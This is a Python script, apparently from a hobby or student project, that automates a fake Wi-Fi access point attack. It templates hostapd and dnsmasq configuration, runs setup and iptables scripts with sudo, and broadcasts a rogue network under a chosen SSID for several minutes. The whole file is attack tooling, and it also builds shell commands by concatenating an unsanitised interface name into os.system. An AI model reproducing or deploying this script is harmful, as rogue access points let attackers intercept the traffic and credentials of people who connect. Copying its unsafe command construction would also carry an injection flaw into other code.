import os
import time
from string import Template


def change_template(path, interface, ssid_name):
    # this function replace all the INTERFACE and SSID_NAME mentioned In the file from tha path by interface and
    # ssid_name

    #open file
    with open(path, 'r+') as f:
        template = Template(f.read())
        f.seek(0)
        # replace all INTERFACE and SSID_NAME in file by template substitute
        f.write(template.substitute(INTERFACE=interface, SSID_NAME=ssid_name))
        f.truncate()


def prepare_fake_access_point(interface, ssid_name):
    """
    first the function reboot all needed requirements for the attack
     by stop the hostapd, dnsmasq and by set all the configuration and sh files
     then set the ip tables settings for the attack
     then run the server , the access point by hostapd and by the dnsmasq
    """
    print("start preparation for the conf files")
    # run the reboot sh file
    os.system('sudo sh configuration_files/reboot.sh')
    # create a copy of the configuration and sh files and edit them by the information from the attack
    os.system('rm -rf build_up/')
    os.system('cp -r configuration_files build_up')
    change_template('build_up/hostapd.conf', interface, ssid_name)
    change_template('build_up/dnsmasq.conf', interface, ssid_name)
    change_template('build_up/prepare_ap.sh', interface, ssid_name)
    # run a sh file that edit the settings for the attack
    os.system('sudo sh build_up/prepare_ap.sh')
    print("finish preparation for the conf files")
    print("start the fake access point")
    # run the fake access point by hostapd and dnsmasq
    os.system('sudo sh build_up/run_ap.sh')

    time.sleep(500)

    print("stop the fake access point")
    # set the current interface back to managed mode
    os.system('nmcli dev set ' + interface + ' managed yes')
    os.system('sudo sh configuration_files/reboot.sh')




  
    

